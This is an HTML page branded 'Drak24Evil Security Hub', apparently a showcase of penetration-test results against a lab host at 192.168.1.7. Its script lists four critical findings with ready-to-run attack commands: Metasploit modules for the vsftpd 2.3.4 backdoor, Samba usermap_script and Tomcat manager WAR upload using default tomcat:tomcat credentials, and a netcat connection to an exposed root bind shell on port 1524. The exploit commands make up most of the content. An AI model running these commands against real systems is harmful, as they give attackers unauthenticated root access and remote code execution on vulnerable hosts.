<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drak24Evil | Professional PoC Terminal</title>
    <style>
        :root {
            --cyber-blue: #00d4ff;
            --critical-red: #ff3e3e;
            --high-orange: #ff9d00;
            --dark-bg: #0a0b0c;
            --card-bg: #14171a;
            --accent-green: #00ff41;
            --modal-bg: #1a1d21;
        }

        body {
            background-color: var(--dark-bg);
            color: #e1e1e1;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            margin: 0; padding: 0;
        }

        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }

        header {
            background: var(--card-bg);
            padding: 25px;
            border-bottom: 3px solid var(--cyber-blue);
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .header-title h1 { margin: 0; color: var(--cyber-blue); letter-spacing: 2px; font-size: 1.5em; }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 20px;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid #333;
            padding: 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
        }

        .card:hover { border-color: var(--cyber-blue); transform: scale(1.02); }

        .port-label { color: var(--cyber-blue); font-weight: bold; font-family: monospace; }
        
        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0; top: 0;
            width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.9);
            overflow-y: auto;
        }

        .modal-content {
            background-color: var(--modal-bg);
            margin: 5% auto;
            padding: 30px;
            border: 1px solid var(--cyber-blue);
            width: 80%;
            max-width: 700px;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .poc-header { border-bottom: 1px solid #444; margin-bottom: 20px; padding-bottom: 10px; }
        .poc-title { color: var(--critical-red); font-size: 1.4em; font-weight: bold; }
        
        .section-title { color: var(--cyber-blue); font-size: 0.9em; text-transform: uppercase; margin-top: 15px; display: block; font-weight: bold; }
        .section-content { background: #000; padding: 10px; border-radius: 5px; margin-top: 5px; border-left: 3px solid var(--accent-green); white-space: pre-wrap; font-family: monospace; font-size: 0.9em; }

        .tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.7em; margin-right: 5px; text-transform: uppercase; font-weight: bold; }
        .tag-crit { background: var(--critical-red); color: #fff; }

        footer { text-align: center; padding: 40px; color: #555; }
        a { color: var(--cyber-blue); text-decoration: none; }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="header-title">
            <h1>DRAK24EVIL SECURITY HUB</h1>
            <span style="font-size: 0.8em; color: #777;">POC ARCHIVE // CLICK CARD TO GENERATE REPORT</span>
        </div>
        <a href="https://t.me/Drak24Evil" target="_blank" style="color: #24A1DE; font-weight: bold;">t.me/Drak24Evil</a>
    </header>

    <div class="grid" id="card-container">
        </div>

    <div id="pocModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <div id="poc-data"></div>
        </div>
    </div>

    <footer>
        &copy; 2026 Drak24Evil Security Resources. All rights reserved.
    </footer>
</div>

<script>
    const vulnerabilities = [
        {
            port: "21",
            name: "Pre-Auth Remote Code Execution (vsftpd)",
            severity: "CRITICAL",
            target: "192.168.1.7",
            tool: "Metasploit Framework (msfconsole)",
            method: "Exploitation of vsftpd 2.3.4 'Smile' Backdoor via intentional string trigger.",
            impact: "Complete root-level system compromise. Full access to files, users, and network traffic.",
            exploit: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit"
        },
        {
            port: "445",
            name: "Unauthenticated Samba RCE (usermap_script)",
            severity: "CRITICAL",
            target: "192.168.1.7",
            tool: "Metasploit Framework",
            method: "Abusing 'username map script' configuration error in Samba 3.0.20 to 3.0.25rc3.",
            impact: "Unauthorized execution of arbitrary commands with root privileges.",
            exploit: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit"
        },
        {
            port: "1524",
            name: "Exposed Administrative Shell (Ingreslock)",
            severity: "CRITICAL",
            target: "192.168.1.7",
            tool: "Netcat (nc)",
            method: "Direct socket connection to an unauthenticated bind shell listening on port 1524.",
            impact: "Instant interactive root shell access without credentials.",
            exploit: "nc 192.168.1.7 1524"
        },
        {
            port: "8180",
            name: "Arbitrary WAR File Deployment (Tomcat)",
            severity: "CRITICAL",
            target: "192.168.1.7",
            tool: "Metasploit Framework",
            method: "Authenticated access to Manager GUI using default 'tomcat:tomcat' credentials followed by malicious WAR upload.",
            impact: "Deployment of web shells allowing for remote command execution (RCE).",
            exploit: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nset RHOSTS 192.168.1.7\nset RPORT 8180\nexploit"
        }
    ];

    const container = document.getElementById('card-container');

    vulnerabilities.forEach((v, index) => {
        const card = document.createElement('div');
        card.className = 'card';
        card.onclick = () => openModal(index);
        card.innerHTML = `
            <span class="port-label">PORT ${v.port} / TCP</span>
            <h3>${v.name}</h3>
            <p style="font-size:0.8em; color:#888;">Click to view HackerOne style PoC report.</p>
        `;
        container.appendChild(card);
    });

    function openModal(index) {
        const v = vulnerabilities[index];
        const modal = document.getElementById('pocModal');
        const data = document.getElementById('poc-data');
        
        data.innerHTML = `
            <div class="poc-header">
                <span class="tag tag-crit">${v.severity}</span>
                <div class="poc-title">REPORT: ${v.name}</div>
            </div>
            
            <span class="section-title">TARGET IP</span>
            <div class="section-content">${v.target}</div>

            <span class="section-title">TOOL USED</span>
            <div class="section-content">${v.tool}</div>

            <span class="section-title">METHODOLOGY</span>
            <div class="section-content">${v.method}</div>

            <span class="section-title">IMPACT</span>
            <div class="section-content">${v.impact}</div>

            <span class="section-title">EXPLOIT POC COMMANDS</span>
            <div class="section-content" style="color:var(--accent-green)">${v.exploit}</div>
        `;
        
        modal.style.display = "block";
    }

    function closeModal() {
        document.getElementById('pocModal').style.display = "none";
    }

    window.onclick = function(event) {
        if (event.target == document.getElementById('pocModal')) {
            closeModal();
        }
    }
</script>

</body>
</html>
